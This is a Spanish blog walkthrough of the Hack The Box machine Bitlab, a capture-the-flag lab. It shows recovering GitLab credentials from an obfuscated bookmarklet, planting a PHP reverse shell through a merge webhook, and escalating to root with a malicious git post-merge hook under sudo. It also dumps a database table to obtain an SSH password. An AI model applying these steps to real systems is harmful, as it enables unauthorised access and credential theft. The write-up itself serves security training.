+++
date = "2020-01-11T00:00:00Z"
tags = ["linux", "htb-medium", "php", "rce", "git", "web", "ssh", "sudo"]
categories = ["Hack the Box"]
title = "Hack The Box - Bitlab"
images = ["https://ceso.github.io/images/htb/bitlab/bitlab-header.jpg"]
description = "Mi paso a paso de Bitlab de Hack The Box."
toc = true
aliases = [
    "/hack-the-box/bitlab/"
]
+++
{{< image src="/images/htb/bitlab/info-card.png" position="center" style="border-radius: 8px;" >}}

## Resumen rápido

Primero que nada, tengo que dejar claro que esta máquina tiene dos formas de hacer escalamiento de privilegios: una es haciendo ingenieria inversa y la otra es aprovecharse de una mala configuración de sudo y git. Voy a describir los pasos para ```sudo + git```, como recién estoy empezando a dar mis primeros pasos en cosas de bajo nivel.
A pesar de todo, en el futuro actualizaré este post para reflejar el camino vía ingeniera inversa.

Esta fue una máquina cool, no difícil a nivel técnico, pero una que se necesita enumerar muchísimo, entonces perfecta para mejorar en eso!

Dicho eso, hora de ensuciarse las manos :D

## Nmap

Comenzamos ejecutando nmap para obtener que puertos/servicios están expuestos:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nmap -sC -sV -O 10.10.10.114 -o ininitial-nmap.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 22:33 EST
Nmap scan report for bitlab.htb (10.10.10.114)
Host is up (0.019s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://bitlab.htb/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 12 22:34:15 2019 -- 1 IP address (1 host up) scanned in 17.39 seconds
```

Obtenemos que SSH (22) y HTTP (80) están abiertos más que el servidor web ejecutándose en el puerto 80 es [Gitlab](https://gitlab.com/).

## Enumeración Web

La página de inicio (```http://10.10.10.114/```), solamente es la página de login standard de gitlab:

{{< image src="/images/htb/bitlab/1.1-web_enum.png" position="center" style="border-radius: 8px;" >}}

Probamos a mano los enlaces en la página para ver si funciona, y encontramos con esto que ```Help``` funciona, somos redirigidos a un directorio listado que tiene ```bookmarks.html``` y lo abrimos:

{{< image src="/images/htb/bitlab/1.2-web_enum.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/bitlab/1.3-web_enum.png" position="center" style="border-radius: 8px;" >}}

Vemos que ```Gitlab Login``` es código javascript ofuscado, pasamos a hacer desofusación (yo usé [de4js](https://lelinhtinh.github.io/de4js/) pero cualquier herramienta de desofuscación o incluso la consola de python sirve):

Del código:

```js
javascript:(function(){ var _0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
```

Obtenemos el siguiente:

```js
javascript: (function () {
    var _0x4b18 = ["value", "user_login", "getElementById", "clave", "user_password", "11des0081x"];
    document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = _0x4b18[3];
    document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = _0x4b18[5];
})()
```

Con esas credenciales nos podemos intentamos loguearnos, un usuario llamado ```clave``` y con contraseñá ```11des0081x```, nos logueamos exitosamente y tenemos acceso a algunos proyectos:

{{< image src="/images/htb/bitlab/1.5-web_enum.png" position="center" style="border-radius: 8px;" >}}

Si miramos detalladamente en ```Profile``` encontramos que este proyecto tiene [Auto DevOps](https://docs.gitlab.com/ee/topics/autodevops/) habilitado.
Seguimos enumerando un poco más, y vemos que el proyecto que se llama ```Deployer``` está a cargo de manejar eso: deployear las aplicaciones, en la descripción hay un enlace apuntando a a gitlab, nos fijamos que hay en la documentación de [webhooks](https://docs.gitlab.com/ee/user/project/integrations/webhooks.html), 
después de leer un poco, nos fijamos que hace ```index.php```:

{{< image src="/images/htb/bitlab/1.6-web_enum.png" position="center" style="border-radius: 8px;" >}}

{{< image src="/images/htb/bitlab/1.7-web_enum.png" position="center" style="border-radius: 8px;" >}}

```php
<?php

$input = file_get_contents("php://input");
$payload  = json_decode($input);

$repo = $payload->project->name ?? '';
$event = $payload->event_type ?? '';
$state = $payload->object_attributes->state ?? '';
$branch = $payload->object_attributes->target_branch ?? '';

if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
    echo shell_exec('cd ../profile/; sudo git pull'),"\n";
}

echo "OK\n";
```

Intentando combinar las piezas que tenemos hasta este momento, podemos darnos cuenta del punto de entrada: tenemos que subir un reverse shell en php, teniéndolo mergeado en master (el código de ```index.php``` tiene específicado que un git pull se va a ejecutar si un merge a master sucede), una vez que hacemos eso ejecutamos ```index.php``` desde ```Deployer``` con esto vamos a tener nuestro reverse shell subido al servidor.

## RCE -> www-data -> root

Subimos el siguiente [php reverse shell by pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) cambiamos ```$ip = '127.0.0.1'``` y ```$port = 1234``` a nuestra ip y puerto en los que nuestra máquina está escuchando, después lo mergeamos (vamos a ser redirigidos de forma automática a la página para mergearlo).

Ahora que el reverse shell está subido en el servidor, todavía tenemos que ejecutarlo, para eso tenemos que saber cuál es la ruta para hacerlo, si recordamos el proyecto ```Deployer``` este tiene un index.php que imprime "OK" , podemos ver de acceder al path de deployer para ver si se imprime, si lo hace, entonces sabemos que la ruta para nuestro reverse shell será ```http://10.0.0.14/profile/<name of our reverse shell>```:

{{< image src="/images/htb/bitlab/1.rce.png" position="center" style="border-radius: 8px;" >}}

Ahora que sabemos efectivamente que la url mencionada arriba es la que precisamos usar.
Ejecutamos nuestro listener para el reverse shell y lo ejecutamos, con esto tenemos ejecución de código remota:

```console
root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.114] 57130
Linux bitlab 4.15.0-29-generic #31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 19:56:40 up 12 min,  0 users,  load average: 0.55, 0.56, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@bitlab:/var/www$ pwd
pwd
/var/www
```
Verificamos si tenemos permisos de sudo, y vemos lo siguiente:

```console
www-data@bitlab:/var/www$ sudo -l
sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
www-data@bitlab:/var/www$ getent passwd www-data
getent passwd www-data
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
www-data@bitlab:/tmp/profile$ cd /var/www/html/profile
cd /var/www/html/profile
www-data@bitlab:/var/www/html/profile$ ls -la
ls -la
total 144
drwxr-xr-x 3 root root  4096 Jan 10 19:56 .
drwxr-xr-x 5 root root  4096 Jul 30 12:37 ..
drwxr-xr-x 8 root root  4096 Jan 10 20:02 .git
-rw-r--r-- 1 root root    42 Feb 26  2019 .htaccess
-rw-r--r-- 1 root root   110 Jan  4  2019 README.md
-rw-r--r-- 1 root root 93029 Jan  5  2019 developer.jpg
-rw-r--r-- 1 root root  4184 Jan  4  2019 index.php
-rw-r--r-- 1 root root  5493 Jan 10 19:55 rev-sh.php    
```

Hasta ahora, sabemos que los repositorios de git están en ```/var/www/html``` y que tenemos permitido ejecutar un git pull con permisos de sudo desde adentro de los repositorios, esto es lo que vamos a usar para aprovecharnos de los webhooks habilitados en gitlab (post-merge hook) y nuestra capacidad de ejecutar el git pull con permisos de root (```git pull``` es como git fetch pero mergea de una por decirlo de un modo), para entender mejor como esas dos cosas funcionan nos vamos a la documentación de git para [hooks: post merge](https://git-scm.com/docs/githooks#_post_merge) y la de [git pull](https://git-scm.com/docs/git-pull).

Nuestro repositorio no nos permite editar archivos ahí, así que lo copiamos a un lugar donde podamos:

```console
www-data@bitlab:/var/www/html$ cp -r profile /tmp/profile
cp -r profile /tmp/profile
www-data@bitlab:/tmp/profile$ ls -la
ls -la
total 148
drwxr-xr-x 4 www-data www-data  4096 Jan 10 20:08 .
drwxrwxrwt 3 root     root      4096 Jan 10 20:03 ..
drwxr-xr-x 8 www-data www-data  4096 Jan 10 20:03 .git
-rw-r--r-- 1 www-data www-data    42 Jan 10 20:03 .htaccess
-rw-r--r-- 1 www-data www-data   110 Jan 10 20:03 README.md
-rw-r--r-- 1 www-data www-data 93029 Jan 10 20:03 developer.jpg
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 foo
-rw-r--r-- 1 www-data www-data  4184 Jan 10 20:03 index.php
drwxr-xr-x 3 www-data www-data  4096 Jan 10 20:08 profile
-rw-r--r-- 1 www-data www-data  5493 Jan 10 20:03 rev-sh.php
```

Creamos un script que se llama ```post-merge``` adentro de ```.git/hooks``` para conseguir un shell como root y le damos permisos de ejcución:

```console
www-data@bitlab:/tmp/profile$ cd .git/hooks
cd .git/hooks
www-data@bitlab:/tmp/profile/.git/hooks$ echo 'exec /bin/bash 0<&2 1>&2' > post-merge
< 'exec /bin/bash 0<&2 1>&2' > post-merge
www-data@bitlab:/tmp/profile/.git/hooks$ chmod u+x post-merge
chmod u+x post-merge
```

Una vez que hicimos eso, subimos cualquier archivo (no importa cuál!) a gitlab y lo mergeamos, una vez que hacemos eso desde la ruta donde tenemos permisos, ejecutamos ```sudo git pull``` y con eso ahora somos root:

```console
www-data@bitlab:/tmp/profile$ sudo git pull
sudo git pull
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (3/3), done.
Unpacking objects: 100% (3/3), done.
remote: Total 3 (delta 2), reused 0 (delta 0)
From ssh://localhost:3022/root/profile
   35da5b2..cbbc729  master     -> origin/master
 * [new branch]      patch-2    -> origin/patch-8
Updating 35da5b2..cbbc729
Fast-forward
 1asf | 1 +
 1 file changed, 1 insertion(+)
 create mode 100644 1asf
root@bitlab:/tmp/profile# id
id
uid=0(root) gid=0(root) groups=0(root)
root@bitlab:/tmp/profile# cd /root    
cd /root
root@bitlab:~# ls   
ls 
root.txt
root@bitlab:~# wc -c root.txt
wc -c root.txt
33 root.txt
```

Con esto ya podemos irnos a ````/home``` y ver ahí la flag de user y de root.

## Más allá de root

Como dije en el principio del post, hay dos caminos para esta máquina:
Ok, as I said at the begining of the post, there are 2 paths to get this box:

1 - El modo "pensado por el creado" (user -> root) es haciendo ingenieria inversa.
2 - Aprovecharse de configuraciones mal hechas.

Voy a cubrir el punto uno, pero solamente como hacerse con el usuario, y en el futuro si tengo idea de ingenieria inversa, voy a postear la parte que falta)

## Usuario

En la página de inicio del proyecto Profile, hay un hint, se menciona una conexión a postgresql y snippets, nos vamos a la página de snippets y encontramos esto:

{{< image src="/images/htb/bitlab/1-intended_user.png" position="center" style="border-radius: 8px;" >}}

Lo abrimos y vemos que es un script para conectarse a la base de datos y hacer un dump de los perfiles:

```js
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
```

Entonces, desde adentro del proyecto Profile agregamos un archivo con ese código, pero también creamos un array con ```pg_fetch_all($result)``` para guardarnos todos los perfiles que se les hace un dump, con eso tenemos este resultado:

```js
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
$arr = pg_fetch_all($result);
print_r($arr);
```

Y despué de guardarlos y hacerle merge, nos vamos a ```http://10.10.10.114/profile/<el nombre que le diste al script>```, y deberíamos tener como resultado el array en pantalla con el usuario ```clave``` y una contraseñá:

```js
Array ( [0] => Array ( [id] => 1 [username] => clave [password] => c3NoLXN0cjBuZy1wQHNz== ) )
```

Antes de intentar romperla por fuerza bruta, probamos usarla así como está, y éxito! La contraseña era esa, no estaba encriptada!

```console
root@kali:~/Documents/HTB/boxes/medium/linux/bitlab# ssh 10.10.10.114 -l clave
clave@10.10.10.114's password: 
Last login: Fri Jan 10 19:45:16 2020 from 10.10.14.7
clave@bitlab:~$ id
uid=1000(clave) gid=1000(clave) groups=1000(clave)
clave@bitlab:~$ ls -la
total 44
drwxr-xr-x 4 clave clave  4096 Aug  8 14:40 .
drwxr-xr-x 3 root  root   4096 Feb 28  2019 ..
lrwxrwxrwx 1 root  root      9 Feb 28  2019 .bash_history -> /dev/null
-rw-r--r-- 1 clave clave  3771 Feb 28  2019 .bashrc
drwx------ 2 clave clave  4096 Aug  8 14:40 .cache
drwx------ 3 clave clave  4096 Aug  8 14:40 .gnupg
-rw-r--r-- 1 clave clave   807 Feb 28  2019 .profile
-r-------- 1 clave clave 13824 Jul 30 19:58 RemoteConnection.exe
-r-------- 1 clave clave    33 Feb 28  2019 user.txt
clave@bitlab:~$ wc -c user.txt 
33 user.txt
```

Obtenemos el shell del usuario, y después de listar archivos en su home, vemos un archivo interesante que se llama ```RemoteConnection.exe```, desde ahí vamos a necesitar descargarlo y empezar a ensuciarnos un poco las manos con algun debugger y hacer ingenieria inversa para ver que esconde adentro, perooo como dije antes, lo voy a actualizar en el momento en que aprenda a hacerlo :P.

Bueno, entonces sabemos que esta máquina tiene dos formas de conseguir root. Me encantó esta máquina, y estoy esperando a tirarme al agua con ella de nuevo cuando tenga un poquito más de idea de ing. inversa.

Ta luego, hasta el próximo paso a paso!